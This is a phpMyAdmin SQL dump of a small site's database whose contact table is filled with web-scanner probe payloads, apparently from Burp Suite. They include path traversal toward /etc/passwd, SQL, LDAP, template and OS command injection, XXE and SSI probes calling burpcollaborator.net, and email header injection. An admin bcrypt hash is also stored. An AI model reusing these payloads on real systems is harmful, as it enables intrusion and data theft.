-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Nov 18, 2021 at 04:18 AM
-- Server version: 10.4.11-MariaDB
-- PHP Version: 7.4.5

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `idnfthosting`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(256) NOT NULL,
  `password` varchar(255) NOT NULL,
  `nama` varchar(256) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`, `nama`, `email`, `phone`) VALUES
(8, 'admin', '$2y$10$6/3VUTsi3C.Y.XT1.Wtgnuape.glPKzb3tNO8w8FAYxrq2Uk6878y', 'admin', 'admin@gmail.com', '');

-- --------------------------------------------------------

--
-- Table structure for table `artikel`
--

CREATE TABLE `artikel` (
  `Id` int(255) NOT NULL,
  `Judul` varchar(256) NOT NULL,
  `Paragraf1` varchar(2000) NOT NULL,
  `Paragraf2` varchar(2000) NOT NULL,
  `Paragraf3` varchar(2000) NOT NULL,
  `Paragraf4` varchar(2000) NOT NULL,
  `Paragraf5` varchar(2000) NOT NULL,
  `Paragraf6` varchar(2000) NOT NULL,
  `Paragraf7` varchar(2000) NOT NULL,
  `gambar` varchar(256) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `artikel`
--

INSERT INTO `artikel` (`Id`, `Judul`, `Paragraf1`, `Paragraf2`, `Paragraf3`, `Paragraf4`, `Paragraf5`, `Paragraf6`, `Paragraf7`, `gambar`) VALUES
(50, 'Edit Artikel', ' 123', ' 123', ' 123', ' 123', ' 123', ' 123', ' 123', '20211115_962786976'),
(55, '123', '123', ' ', ' ', ' ', ' ', ' ', ' ', '20211114_490348594.jpeg'),
(56, 'Ini Judul', 'Ini Paragraf', ' ', ' ', ' ', ' ', ' ', ' ', '20211115_346589682.png');

-- --------------------------------------------------------

--
-- Table structure for table `contact`
--

CREATE TABLE `contact` (
  `status` varchar(255) NOT NULL,
  `id` int(11) NOT NULL,
  `nama` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `subject` varchar(255) NOT NULL,
  `message` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `contact`
--

INSERT INTO `contact` (`status`, `id`, `nama`, `email`, `subject`, `message`) VALUES
('Reply', 102, '.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 103, '...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 104, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 105, 'windowswin.ini', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 106, '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 107, '840636../../../../../../../../../../../../../../../../windows/win.ini', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 108, '840636..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 109, '840636../../../../../../../../../../../../../../../../winnt/win.ini', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 110, '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 111, 'c:\\windows\\win.ini840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 112, '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 113, '../../../../../../../../../../../../../../../../etc/passwd', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 114, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 115, '/etc/passwd', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 116, 'file:///etc/passwd', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 117, '..././..././..././..././..././..././..././..././..././..././etc/passwd', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 118, '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 119, '840636../../../../../../../../../../../../../../../../etc/passwd', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 120, '../../../../../../../../../../../../../../../../etc/passwd840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 121, '.../840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 122, './contact', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 123, '/./contact', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 124, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 125, '25gulqwike)(objectClass=*', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 126, 'jmi4eurrpw)(!(objectClass=*)', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 127, '*)(objectClass=*', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 128, '*)(!(objectClass=*)', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 129, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 130, '<gik xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://c3gwng7vkl0byu5ixronp6yohfn8bzdndb5yvmk.burpcollaborator.net/gik.xsd\">gik</gik>', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 131, '<mta xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://z00jk34ih8xyvh25uelamtvbe2kv8maaby3lt9i.burpcollaborator.net/foo\"/></mta>', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 132, '840636]]>><', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 133, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 134, '(function(){if(typeof n9xgf===\'undefined\'){var a=new Date();do{var b=new Date();}while(b-a<20000);n9xgf=1;}}())', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 135, '840636\'+(function(){if(typeof udovw===\"undefined\"){var a=new Date();do{var b=new Date();}while(b-a<20000);udovw=1;}}())+\'', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 136, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 137, '\"-->\'-->`--><!--#set var=\"8yw\" value=\"7xvrhb1qeg\"--><!--#set var=\"a0y\" value=\"9zxtjd3sgi\"--><!--#echo var=\"8yw\"--><!--#echo var=\"a0y\"--><!--#exec cmd=\"nslookup -q=cname ukie4yod13htfcm0e9556of6yx4qshu5m3avxlla.burpcollaborator.net\" -->', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 138, '840636\r\nBCC:p8y9stc8py5o37av24t0uj31msslgci0atyllb90@burpcollaborator.net\r\nsey: n', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 139, '840636>\r\nBCC:6szqcawp9fp5noucmldhe0ni69c20t2hubi35tti@burpcollaborator.net\r\nkuu: a', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 140, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 141, '840636', '(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % njzzf SYSTEM \"http://dj0x3hnw0mgcevljds4o57epxg39r0towcozfn4.burpcollab\'||\'orator.net/\">%njzzf;]>\'),\'/l\') from dual)', '637007', '112309'),
('', 142, '840636', 'RyFsGciC@burpcollaborator.net\'||(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % njzzf SYSTEM \"http://1lnl55pk2ai0gjn7fg6c7vgdz45xtovcz0rnib7.burpcollab\'||\'orator.net/\">%njzzf;]>\'),\'/l\') from dual)||\'', '637007', '112309'),
('', 143, '840636', 'RyFsGciC@burpcollaborator.net;declare @q varchar(99);set @q=\'\\\\8pys9ctr6hm7kqrejnajb2kk3b94xvzjq9e11sph.burpcollab\'+\'orator.net\\muz\'; exec master.dbo.xp_dirtree @q;-- ', '637007', '112309'),
('', 144, '840636', 'RyFsGciC@burpcollaborator.net\';declare @q varchar(99);set @q=\'\\\\b5hvpf9umk2a0t7hzqqmr50njep7dyfm6du5hw5l.burpcollab\'+\'orator.net\\owh\'; exec master.dbo.xp_dirtree @q;-- ', '637007', '112309'),
('', 145, '840636', 'RyFsGciC@burpcollaborator.net);declare @q varchar(99);set @q=\'\\\\gn707krz4pkfiypmhv8r9ais1j7cv3xrojcbz2nr.burpcollab\'+\'orator.net\\hge\'; exec master.dbo.xp_dirtree @q;-- ', '637007', '112309'),
('', 146, '840636', 'RyFsGciC@burpcollaborator.net\');declare @q varchar(99);set @q=\'\\\\jk734no21shif1mpey5u6dfvym4fs6uuln9fw6kv.burpcollab\'+\'orator.net\\ufy\'; exec master.dbo.xp_dirtree @q;-- ', '637007', '112309'),
('', 147, '840636', '(select load_file(\'\\\\\\\\fwfzgj0ydoterxylquhqi9rraigb426qxslk8bw0.burpcollaborator.net\\\\nqs\'))', '637007', '112309'),
('', 148, '840636', 'RyFsGciC@burpcollaborator.net\'+(select load_file(\'\\\\\\\\v95ftzdeq46u4db13au6vp47nytrhij6a9y1ls9h.burpcollaborator.net\\\\xxs\'))+\'', '637007', '112309'),
('', 149, '840636', 'RyFsGciC@burpcollaborator.net\'', '637007', '112309'),
('', 150, '840636', 'RyFsGciC@burpcollaborator.net\'', '637007', '112309'),
('', 151, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 152, '840636', 'RyFsGciC@burpcollaborator.net\'\'', '637007', '112309'),
('', 153, '840636', 'RyFsGciC@burpcollaborator.net\'\'', '637007', '112309'),
('', 154, '840636', '(select*from(select(sleep(20)))a)', '637007', '112309'),
('', 155, '840636', 'RyFsGciC@burpcollaborator.net\'(select*from(select(sleep(20)))a)\'', '637007', '112309'),
('', 156, '840636', 'RyFsGciC@burpcollaborator.net\'+(select*from(select(sleep(20)))a)+\'', '637007', '112309'),
('', 157, '840636', 'RyFsGciC@burpcollaborator.net and (select*from(select(sleep(20)))a)-- ', '637007', '112309'),
('', 158, '840636', 'RyFsGciC@burpcollaborator.net\' and (select*from(select(sleep(20)))a)-- ', '637007', '112309'),
('', 159, '840636', 'RyFsGciC@burpcollaborator.net,(select*from(select(sleep(20)))a)', '637007', '112309'),
('', 160, '840636', 'RyFsGciC@burpcollaborator.net\' waitfor delay\'0:0:20\'--', '637007', '112309'),
('', 161, '840636', 'RyFsGciC@burpcollaborator.net)waitfor delay\'0:0:20\'--', '637007', '112309'),
('', 162, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 163, '840636', 'RyFsGciC@burpcollaborator.net\')waitfor delay\'0:0:20\'--', '637007', '112309'),
('', 164, '840636', 'RyFsGciC@burpcollaborator.net,0)waitfor delay\'0:0:20\'--', '637007', '112309'),
('', 165, '840636', 'RyFsGciC@burpcollaborator.net\',0)waitfor delay\'0:0:20\'--', '637007', '112309'),
('', 166, '840636', 'RyFsGciC@burpcollaborator.net42699922\' or \'6563\'=\'6563', '637007', '112309'),
('', 167, '840636', 'RyFsGciC@burpcollaborator.net11581938\' or \'9252\'=\'9256', '637007', '112309'),
('', 168, '840636', 'RyFsGciC@burpcollaborator.net82483795\' or 7048=7048-- ', '637007', '112309'),
('', 169, '840636', 'RyFsGciC@burpcollaborator.net91942249\' or 2114=2118-- ', '637007', '112309'),
('', 170, '840636', 'RyFsGciC@burpcollaborator.net16451952\' or 5111=5111-- ', '637007', '112309'),
('', 171, '840636', 'RyFsGciC@burpcollaborator.net34789295\' or 9809=9809\'-- ', '637007', '112309'),
('', 172, '840636', 'RyFsGciC@burpcollaborator.net\' and \'9877\'=\'9877', '637007', '112309'),
('', 173, '840636', 'RyFsGciC@burpcollaborator.net\' and \'4709\'=\'4711', '637007', '112309'),
('', 174, '840636', 'RyFsGciC@burpcollaborator.net\' and 9476=9476-- ', '637007', '112309'),
('', 175, '840636', 'RyFsGciC@burpcollaborator.net\' and 9162=9169-- ', '637007', '112309'),
('', 176, '840636', 'RyFsGciC@burpcollaborator.net\"', '637007', '112309'),
('', 177, '840636', 'j72iuj50wt', '637007', '112309'),
('', 178, '840636', 'RyFsGciC@burpcollaborator.netwfoc8jvmgv', '637007', '112309'),
('', 179, '840636', 'le6he${377*856}vkhn4', '637007', '112309'),
('', 180, '840636', 'h0plf{{935*886}}gjs5a', '637007', '112309'),
('', 181, '840636', 'RyFsGciC@burpcollaborator.net}}vez50\'/\"<odo42', '637007', '112309'),
('', 182, '840636', 'RyFsGciC@burpcollaborator.net%}xig11\'/\"<r1rpn', '637007', '112309'),
('', 183, '840636', 'RyFsGciC@burpcollaborator.netcijqy%>j8m9h\'/\"<og6sn', '637007', '112309'),
('', 184, '840636', 'RyFsGciC@burpcollaborator.net\'+sleep(20.to_i)+\'', '637007', '112309'),
('', 185, '840636', 'RyFsGciC@burpcollaborator.net\'+eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))+\'', '637007', '112309'),
('', 186, '840636', 'eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))', '637007', '112309'),
('', 187, '840636', 'RyFsGciC@burpcollaborator.net\'.sleep(20).\'', '637007', '112309'),
('', 188, '840636', 'RyFsGciC@burpcollaborator.net{${sleep(20)}}', '637007', '112309'),
('', 189, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 190, '840636', 'http://RyFsGciC@ymoi62qh37jxhgo4gd798sha016uulw9mxek58u.burpcollaborator.net/?burpcollaborator.net', '637007', '112309'),
('', 191, '840636', 'nslookup -q=cname p2s9mt68jyzox74vw4n0ojx1gsmlacc053tvgm4b.burpcollaborator.net.&', '637007', '112309'),
('', 192, '840636', 'RyFsGciC@burpcollaborator.net|nslookup -q=cname hn817lr04qkgizpnhw8s9bit1k7dv4xstgl3cr1.burpcollaborator.net.&', '637007', '112309'),
('', 193, '840636', 'RyFsGciC@burpcollaborator.net\'\"`0&nslookup -q=cname dxexhh1wemucsvzjrsioj7spbgh9507o4cwznnc.burpcollaborator.net.&`\'', '637007', '112309'),
('', 194, '840636', 'RyFsGciC@burpcollaborator.net&nslookup -q=cname 1ikl25mkzaf0djk7cg3c4vddw42xqoscn0fn6bv.burpcollaborator.net.&\'\\\"`0&nslookup -q=cname 1ikl25mkzaf0djk7cg3c4vddw42xqoscn0fn6bv.burpcollaborator.net.&`\'', '637007', '112309'),
('', 195, '840636', 'RyFsGciC@burpcollaborator.net|echo jf7r2aasd6 tas37iegvf||a #\' |echo jf7r2aasd6 tas37iegvf||a #|\" |echo jf7r2aasd6 tas37iegvf||a #', '637007', '112309'),
('', 196, '840636', 'RyFsGciC@burpcollaborator.net&echo 7ncre31kfn f1oubn8p2g&', '637007', '112309'),
('', 197, '840636', 'RyFsGciC@burpcollaborator.net\"|echo sh5ftu90hu xxoy9yj6h2 ||', '637007', '112309'),
('', 198, '840636', 'RyFsGciC@burpcollaborator.net\'|echo jey2hgwah3 496j0bbr1r #xzwx', '637007', '112309'),
('', 199, '840636', 'RyFsGciC@burpcollaborator.net|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1', '637007', '112309'),
('', 200, '840636', 'RyFsGciC@burpcollaborator.net|ping -c 21 127.0.0.1||x', '637007', '112309'),
('', 201, '840636', 'RyFsGciC@burpcollaborator.net&ping -n 21 127.0.0.1&', '637007', '112309'),
('', 202, '840636', 'RyFsGciC@burpcollaborator.net\'|ping -c 21 127.0.0.1 #', '637007', '112309'),
('', 203, '840636', 'RyFsGciC@burpcollaborator.net\"|ping -n 21 127.0.0.1 ||', '637007', '112309'),
('', 204, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 205, '840636', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', '637007', '112309'),
('', 206, '840636', 'c:\\windows\\win.ini', '637007', '112309'),
('', 207, '840636', '../../../../../../../../../../../../../../../../windows/win.ini', '637007', '112309'),
('', 208, '840636', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini', '637007', '112309'),
('', 209, '840636', '../../../../../../../../../../../../../../../../winnt/win.ini', '637007', '112309'),
('', 210, '840636', 'file:///c:/windows/win.ini', '637007', '112309'),
('', 211, '840636', '...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini', '637007', '112309'),
('', 212, '840636', '.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini', '637007', '112309'),
('', 213, '840636', '...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini', '637007', '112309'),
('', 214, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 215, '840636', 'windowswin.ini', '637007', '112309'),
('', 216, '840636', '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini', '637007', '112309'),
('', 217, '840636', 'RyFsGciC@burpcollaborator.net..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', '637007', '112309'),
('', 218, '840636', 'RyFsGciC@burpcollaborator.net../../../../../../../../../../../../../../../../windows/win.ini', '637007', '112309'),
('', 219, '840636', 'RyFsGciC@burpcollaborator.net..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini', '637007', '112309'),
('', 220, '840636', 'RyFsGciC@burpcollaborator.net../../../../../../../../../../../../../../../../winnt/win.ini', '637007', '112309'),
('', 221, '840636', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.iniRyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 222, '840636', 'c:\\windows\\win.iniRyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 223, '840636', '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.iniRyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 224, '840636', '../../../../../../../../../../../../../../../../etc/passwd', '637007', '112309'),
('', 225, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 226, '840636', '/etc/passwd', '637007', '112309'),
('', 227, '840636', '..././..././..././..././..././..././..././..././..././..././etc/passwd', '637007', '112309'),
('', 228, '840636', 'etcpasswd', '637007', '112309'),
('', 229, '840636', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '637007', '112309'),
('', 230, '840636', 'RyFsGciC@burpcollaborator.net../../../../../../../../../../../../../../../../etc/passwd', '637007', '112309'),
('', 231, '840636', '../../../../../../../../../../../../../../../../etc/passwdRyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 232, '840636', '.../RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 233, '840636', './contact', '637007', '112309'),
('', 234, '840636', '/./contact', '637007', '112309'),
('', 235, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 236, '840636', '8lx7w1wny1)(!(objectClass=*)', '637007', '112309'),
('', 237, '840636', 'c7xo60xj9u)(!(!(objectClass=*))', '637007', '112309'),
('', 238, '840636', '*)(objectClass=*', '637007', '112309'),
('', 239, '840636', '*)(!(objectClass=*)', '637007', '112309'),
('', 240, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 241, '840636', '<hgp xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://96dtqdasni381r8f0orks31lkcq5ewgkg88vzjo.burpcollaborator.net/hgp.xsd\">hgp</hgp>', '637007', '112309'),
('', 242, '840636', '<qvj xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://8lus5cpr2hi7gqnefn6j72gkzb54tvvjw7oufi4.burpcollaborator.net/foo\"/></qvj>', '637007', '112309'),
('', 243, '840636', 'RyFsGciC@burpcollaborator.net]]>><', '637007', '112309'),
('', 244, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 245, '840636', 'RyFsGciC@burpcollaborator.net\'+(function(){if(typeof prucf===\"undefined\"){var a=new Date();do{var b=new Date();}while(b-a<20000);prucf=1;}}())+\'', '637007', '112309'),
('', 246, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 247, '840636', '\"-->\'-->`--><!--#set var=\"cac\" value=\"b9bvtfduqk\"--><!--#set var=\"ece\" value=\"dbdxvhfwsm\"--><!--#echo var=\"cac\"--><!--#echo var=\"ece\"--><!--#exec cmd=\"nslookup -q=cname ywyig20hd7txrgy4qdh9israa1gu4l69y7mz9qxf.burpcollaborator.net\" -->', '637007', '112309'),
('', 248, '840636', 'RyFsGciC@burpcollaborator.net\r\nBCC:x97ht1dgq66w4fb33cu8vr49n0tthkj8b1ztmka9@burpcollaborator.net\r\njkw: y', '637007', '112309'),
('', 249, '840636', 'RyFsGciC@burpcollaborator.net>\r\nBCC:vhgf1zley4eucdj1ba263pc7vy1rpir6j07suji8@burpcollaborator.net\r\nhxy: a', '637007', '112309'),
('', 250, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 251, '840636', 'yjli32nh07gxegl4dd495seax13urlt9l49wwnkc@burpcollaborator.net', '637007', '112309'),
('', 252, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 253, '840636', 'RyFsGciC@burpcollaborator.net', '(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % xiefn SYSTEM \"http://bm1v6fqu3kjahtohgq7m85hn0e67uywmzarxjl8.burpcollab\'||\'orator.net/\">%xiefn;]>\'),\'/l\') from dual)', '112309'),
('', 254, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'||(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % xiefn SYSTEM \"http://wllg50pf25ivgen2fb677qg8zz5stjv7zvrij68.burpcollab\'||\'orator.net/\">%xiefn;]>\'),\'/l\') from dual)||\'', '112309'),
('', 255, '840636', 'RyFsGciC@burpcollaborator.net', '637007;declare @q varchar(99);set @q=\'\\\\749rob8qlg16zp6dympiq1zjiao3cuei58t0gs4h.burpcollab\'+\'orator.net\\rib\'; exec master.dbo.xp_dirtree @q;-- ', '112309'),
('', 256, '840636', 'RyFsGciC@burpcollaborator.net', '637007);declare @q varchar(99);set @q=\'\\\\bm1v6fqu3kjahtohgq7m85hn0e67uywmneb6yymn.burpcollab\'+\'orator.net\\ilq\'; exec master.dbo.xp_dirtree @q;-- ', '112309'),
('', 257, '840636', 'RyFsGciC@burpcollaborator.net', '637007\');declare @q varchar(99);set @q=\'\\\\fn6z7jry4okeixplhu8q99ir1i7bv2xqojcbz3ns.burpcollab\'+\'orator.net\\bhx\'; exec master.dbo.xp_dirtree @q;-- ', '112309'),
('', 258, '840636', 'RyFsGciC@burpcollaborator.net', '(select load_file(\'\\\\\\\\132ln57kka00yj57xgocpvydh4nxbodc4es6fy3n.burpcollaborator.net\\\\jys\'))', '112309'),
('', 259, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'+(select load_file(\'\\\\\\\\ulje5ypd23itgcn0f9657og6zx5qthv5m8a0xslh.burpcollaborator.net\\\\xcb\'))+\'', '112309'),
('', 260, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'', '112309'),
('', 261, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'', '112309'),
('', 262, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 263, '840636', 'RyFsGciC@burpcollaborator.net', '(select*from(select(sleep(20)))a)', '112309'),
('', 264, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'(select*from(select(sleep(20)))a)\'', '112309'),
('', 265, '840636', 'RyFsGciC@burpcollaborator.net', '637007+(select*from(select(sleep(20)))a)+', '112309'),
('', 266, '840636', 'RyFsGciC@burpcollaborator.net', '637007\'+(select*from(select(sleep(20)))a)+\'', '112309'),
('', 267, '840636', 'RyFsGciC@burpcollaborator.net', '637007\' and (select*from(select(sleep(20)))a)-- ', '112309'),
('', 268, '840636', 'RyFsGciC@burpcollaborator.net', '637007,(select*from(select(sleep(20)))a)', '112309'),
('', 269, '840636', 'RyFsGciC@burpcollaborator.net', '637007 waitfor delay\'0:0:20\'--', '112309'),
('', 270, '840636', 'RyFsGciC@burpcollaborator.net', '637007\' waitfor delay\'0:0:20\'--', '112309'),
('', 271, '840636', 'RyFsGciC@burpcollaborator.net', '637007)waitfor delay\'0:0:20\'--', '112309'),
('', 272, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 273, '840636', 'RyFsGciC@burpcollaborator.net', '637007\')waitfor delay\'0:0:20\'--', '112309'),
('', 274, '840636', 'RyFsGciC@burpcollaborator.net', '637007,0)waitfor delay\'0:0:20\'--', '112309'),
('', 275, '840636', 'RyFsGciC@burpcollaborator.net', '637007\',0)waitfor delay\'0:0:20\'--', '112309'),
('', 276, '840636', 'RyFsGciC@burpcollaborator.net', '63700772544590 or 1541=01541', '112309'),
('', 277, '840636', 'RyFsGciC@burpcollaborator.net', '63700785106701 or 5364=5369', '112309'),
('', 278, '840636', 'RyFsGciC@burpcollaborator.net', '63700742486024 or 9397=09397-- ', '112309'),
('', 279, '840636', 'RyFsGciC@burpcollaborator.net', '63700772019230 or 4754=4763-- ', '112309'),
('', 280, '840636', 'RyFsGciC@burpcollaborator.net', '637007 and 6674=06674', '112309'),
('', 281, '840636', 'RyFsGciC@burpcollaborator.net', '637007 and 9327=9332', '112309'),
('', 282, '840636', 'RyFsGciC@burpcollaborator.net', '637007 and 1620=01620-- ', '112309'),
('', 283, '840636', 'RyFsGciC@burpcollaborator.net', '637007 and 5241=5250-- ', '112309'),
('', 284, '840636', 'RyFsGciC@burpcollaborator.net', '63700775777112\' or \'5523\'=\'5523', '112309'),
('', 285, '840636', 'RyFsGciC@burpcollaborator.net', '63700778887176\' or \'8316\'=\'8317', '112309'),
('', 286, '840636', 'RyFsGciC@burpcollaborator.net', '63700758823565\' or 1923=1923-- ', '112309'),
('', 287, '840636', 'RyFsGciC@burpcollaborator.net', '63700756319005\' or 1836=1844-- ', '112309'),
('', 288, '840636', 'RyFsGciC@burpcollaborator.net', '637007\' and \'9054\'=\'9054', '112309'),
('', 289, '840636', 'RyFsGciC@burpcollaborator.net', '637007\' and \'3798\'=\'3803', '112309'),
('', 290, '840636', 'RyFsGciC@burpcollaborator.net', '637007\' and \'7723\'=\'7723', '112309'),
('', 291, '840636', 'RyFsGciC@burpcollaborator.net', '637007\' and 4323=4323-- ', '112309'),
('', 292, '840636', 'RyFsGciC@burpcollaborator.net', '637007\' and 4099=4105-- ', '112309'),
('', 293, '840636', 'RyFsGciC@burpcollaborator.net', '637007\"', '112309'),
('', 294, '840636', 'RyFsGciC@burpcollaborator.net', 'aylo1b7t2b', '112309'),
('', 295, '840636', 'RyFsGciC@burpcollaborator.net', '637007h0e6i27iq3', '112309'),
('', 296, '840636', 'RyFsGciC@burpcollaborator.net', 'aho3u${876*722}q1lkk', '112309'),
('', 297, '840636', 'RyFsGciC@burpcollaborator.net', 'x5bzp{{174*770}}hhnk3', '112309'),
('', 298, '840636', 'RyFsGciC@burpcollaborator.net', '637007}}yd560\'/\"<ee7k9', '112309'),
('', 299, '840636', 'RyFsGciC@burpcollaborator.net', '637007%}fx9xe\'/\"<h8cje', '112309'),
('', 300, '840636', 'RyFsGciC@burpcollaborator.net', '637007alqee%>ixpvj\'/\"<enhmf', '112309'),
